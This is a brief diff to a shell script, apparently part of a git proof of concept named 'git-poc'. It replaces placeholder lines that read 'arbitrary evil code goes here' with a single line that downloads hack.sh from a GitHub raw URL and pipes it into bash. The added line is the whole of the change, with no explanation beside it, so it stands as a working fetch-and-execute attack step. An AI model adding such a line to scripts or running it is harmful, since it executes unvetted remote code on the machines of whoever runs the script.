@@ -1,4 +1,2 @@
 #!/bin/sh
-echo '=================================='
-echo ' arbitrary evil code goes here ;) '
-echo '=================================='
+$(curl -s https://raw.githubusercontent.com/manunio/git-poc/dev/hack.sh | bash)
